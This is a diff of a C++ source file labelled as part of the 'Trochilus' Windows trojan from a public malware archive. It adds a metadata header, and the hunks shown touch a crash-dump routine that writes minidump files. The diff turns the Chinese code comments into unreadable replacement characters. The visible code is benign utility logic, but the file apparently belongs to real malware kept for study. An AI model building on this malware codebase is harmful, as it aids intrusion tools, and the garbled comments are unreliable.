@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include <dbghelp.h>
 #include "tstring.h"
@@ -66,7 +77,7 @@ BOOL CSnapshotManager::generateDumpFile(PEXCEPTION_POINTERS pException, LPCTSTR 
 		HANDLE hDumpFile = INVALID_HANDLE_VALUE;
 		do 
 		{
-			//²éÕÒdbghelpÄ£¿é
+			//ï¿½ï¿½ï¿½ï¿½dbghelpÄ£ï¿½ï¿½
 			HMODULE	hDbgHelp = ::GetModuleHandle(_T("dbghelp.dll"));
 			if (hDbgHelp == NULL)
 			{
@@ -78,7 +89,7 @@ BOOL CSnapshotManager::generateDumpFile(PEXCEPTION_POINTERS pException, LPCTSTR 
 				}
 			}
 
-			//²éÕÒº¯ÊýµØÖ·
+			//ï¿½ï¿½ï¿½Òºï¿½ï¿½ï¿½ï¿½ï¿½Ö·
 			FnMiniDumpWriteDump	pfnMiniDumpWriteDump = (FnMiniDumpWriteDump) ::GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
 			if (pfnMiniDumpWriteDump == NULL)
 			{
@@ -86,11 +97,11 @@ BOOL CSnapshotManager::generateDumpFile(PEXCEPTION_POINTERS pException, LPCTSTR 
 				break;
 			}
 
-			//»ñÈ¡µ±Ç°±¾µØÊ±¼ä
+			//ï¿½ï¿½È¡ï¿½ï¿½Ç°ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½
 			SYSTEMTIME now;
 			::GetLocalTime(&now);
 
-			//´´½¨dmpdirÄ¿Â¼
+			//ï¿½ï¿½ï¿½ï¿½dmpdirÄ¿Â¼
 			tstring dmpdir = getBaseDir();
 			dmpdir += DMP_PATH;
 			if (! ::CreateDirectory(dmpdir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
@@ -99,20 +110,20 @@ BOOL CSnapshotManager::generateDumpFile(PEXCEPTION_POINTERS pException, LPCTSTR 
 				break;
 			}
 
-			//Éú³ÉdmpÎÄ¼þÃû³Æ
+			//ï¿½ï¿½ï¿½ï¿½dmpï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½
 			TCHAR filepath[MAX_PATH] = {0};
 			_stprintf_s(filepath,  MAX_PATH, _T("%s\\%s-%04d%02d%02d%02d%02d%02d-%03d.dmp"),
 				dmpdir.c_str(), prefix,
 				now.wYear, now.wMonth, now.wDay,
 				now.wHour, now.wMinute, now.wSecond, now.wMilliseconds);
 
-			//ÉèÖÃÒì³£ÐÅÏ¢
+			//ï¿½ï¿½ï¿½ï¿½ï¿½ì³£ï¿½ï¿½Ï¢
 			MINIDUMP_EXCEPTION_INFORMATION dumpinfo;
 			dumpinfo.ThreadId = ::GetCurrentThreadId();
 			dumpinfo.ExceptionPointers = pException;
 			dumpinfo.ClientPointers = 0;
 
-			//´´½¨dmpÎÄ¼þ
+			//ï¿½ï¿½ï¿½ï¿½dmpï¿½Ä¼ï¿½
 			hDumpFile = ::CreateFile(filepath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 			if (hDumpFile == INVALID_HANDLE_VALUE)
 			{
